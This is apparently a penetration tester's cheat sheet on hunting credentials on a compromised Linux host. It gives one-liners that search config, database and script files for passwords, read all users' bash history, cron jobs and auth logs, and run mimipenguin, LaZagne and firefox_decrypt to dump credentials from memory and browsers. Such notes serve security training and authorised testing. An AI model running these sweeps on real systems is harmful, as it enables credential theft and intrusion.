# Credential Hunting in Linux

Config files — sweep all three extensions, grep for creds inline:

```bash
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core";done
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

DB files:

```bash
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB ext: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```

Scripts with hardcoded creds:

```bash
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

Notes — txt files and extensionless files in home dirs:

```bash
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

Bash history across all users — often contains plaintext creds in commands:

```bash
tail -n5 /home/*/.bash*
```

Cronjobs — check for hardcoded creds in scripts called by cron:

```bash
cat /etc/crontab
ls -la /etc/cron.*/
```

Log sweep — auth events, sudo commands, failed logins:

```bash
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|failure\|failed\|ssh\|password changed\|sudo\|COMMAND\=" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|failure\|failed\|ssh\|password changed\|sudo\|COMMAND\=" $i 2>/dev/null;fi;done
```

Memory — requires root:

```bash
sudo python3 mimipenguin.py
sudo python2.7 laZagne.py all
sudo python3 laZagne.py browsers
```

Firefox saved creds — decrypt logins.json directly:

```bash
ls -l ~/.mozilla/firefox/ | grep default
python3.9 firefox_decrypt.py
```

> [!tip] `.bash_history` is the fastest win — commands like `su`, `mysql -u root -p`, `sshpass`, or script executions with inline passwords show up constantly. Check it first before running any sweep tools.